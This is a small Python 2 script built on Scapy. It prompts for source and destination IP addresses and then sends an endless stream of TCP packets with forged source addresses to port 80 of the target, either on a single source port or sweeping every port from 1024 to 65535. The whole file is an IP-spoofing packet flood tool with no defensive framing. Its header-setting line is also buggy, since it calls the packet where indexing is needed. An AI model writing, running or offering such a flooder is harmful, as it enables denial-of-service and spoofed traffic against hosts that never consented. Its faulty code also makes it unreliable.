
from scapy.all import*
import os

def spoof(src,dst,port = None):
    if port is not None:
        packet = IP(src=src, dst=dst) / TCP(dport=80)
        packet(TCP).sport = port

        try:
            while True:
                try:
                    send(packet)
                    print "Packet sent from %s to %s on port %d" %(src, dst, port)
                except:
                    print "Unable to send packets check your inputs or connection"
                    break
        except KeyboardInterrupt:
            return
    else:
        while True:
            try:
                for port in range(1024, 65536):
                    packet = IP(src=src, dst=dst) / TCP(dport=80)
                    packet(TCP).sport = port
                    try:
                        send(packet)
                        print "Packet sent from %s to %s on port %d" %(src, dst, port)
                    except:
                        break
            except KeyboardInterrupt:
                break


def spoofMain():


    src = raw_input("Enter source IP address: ")

    dst = raw_input("Enter destination IP address: ")

    port = raw_input("Enter port to spoof on [optional]: ")
    if len(port) < 1:
        port = None

    if port:
        spoof(src, dst, int(port))
    else:
        spoof(src, dst)





